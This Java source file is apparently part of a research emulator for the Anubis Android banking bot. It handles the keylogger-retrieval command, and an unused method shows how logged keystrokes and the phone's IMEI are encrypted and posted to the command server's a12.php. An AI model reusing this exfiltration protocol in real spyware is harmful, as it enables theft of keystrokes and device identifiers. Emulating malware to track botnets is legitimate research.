/*
 * Copyright (C) 2020 Max 'Libra' Kersten [@Libranalysis, https://maxkersten.nl]
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */
package anubis.commands;

import bot.network.Connector;
import anubis.bot.AnubisBot;
import java.io.IOException;

/**
 * This class handles the upload of logged keystrokes to the C2
 *
 * @author Max 'Libra' Kersten [@Libranalysis, https://maxkersten.nl]
 */
public class GetKeyloggerData {

    /**
     * This class handles the upload of logged keystrokes to the C2
     *
     * @param bot the bot
     * @throws Exception if the HTTP request fails
     */
    public GetKeyloggerData(AnubisBot bot) throws Exception {
        String log = "Received command to retrieve all keylogger data";
        bot.addLog(log);

    }

    /**
     * A function to upload the logs in the correct format. Currently, m3 does
     * not support the creation of fake keystroke logging. If one were to
     * implement it, the base to do so is given below.
     *
     * @param bot the bot
     * @throws IOException if there is an error whilst reading the log file
     * @throws Exception if the HTTP request fails
     */
    private void uploadLogs(AnubisBot bot) throws IOException, Exception {
        String s = bot.getLocalFileSystemManager().readStringFromPath("keys.log");
        s = s.replace("|^|", "\n");
        String url = bot.getServer() + "/" + bot.getServerFolder() + "/a12.php";
        Connector connector = bot.getConnector();
        String parameter = "p=" + bot.getEncryptionHandler().encrypt(bot.getPhone().getImei() + "~~~~~~~~~~" + s);
        String response = connector.post(url, parameter);
        response = bot.getEncryptionHandler().untag(response);
        response = bot.getEncryptionHandler().decrypt(response);

        String log = "";
        if (response.contains("clear")) { //the default response, or its empty if something goes wrong
            //Empty log file
            bot.getLocalFileSystemManager().overwriteFile(new byte[0], "keys.log");
            log = "Log file received by the server and cleared locally";
        } else {
            log = "The server did not respond properly, which might mean that the server is down";
        }
        bot.addLog(log);
    }
}
